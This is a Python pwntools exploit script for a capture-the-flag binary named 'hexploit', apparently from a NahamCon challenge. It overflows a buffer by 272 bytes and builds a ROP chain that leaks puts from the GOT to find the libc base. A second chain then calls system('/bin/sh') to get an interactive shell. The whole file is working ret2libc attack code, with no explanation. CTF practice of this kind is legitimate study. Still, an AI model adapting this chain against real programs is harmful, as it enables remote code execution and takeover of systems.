from pwn import *
context.arch = "amd64"

io = process("./hexploit")
# io = remote("challenge.nahamcon.com", 32146)
elf = ELF("./hexploit")
rop = ROP(elf)
libc = ELF("./libc-2.31.so")

def encode(value):
	data = p64(value).hex()
	ba = bytearray.fromhex(data)
	return ba.hex()

offset = 272
payload = "A"*offset
payload += encode(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += encode(elf.got.puts)
payload += encode(elf.plt.puts)
payload += encode(elf.symbols.main)

io.sendline(payload)
io.recvuntil(b'You entered: ')
io.recvline()
leak = unpack(io.recv(6), 'all')

log.info(f'Puts leak => {hex(leak)}')
libc.address = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')

payload = "A"*offset
payload += encode(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += encode(next(libc.search(b'/bin/sh')))
payload += encode(rop.find_gadget(['ret'])[0])
payload += encode(libc.symbols.system)

io.sendline(payload)
io.interactive()
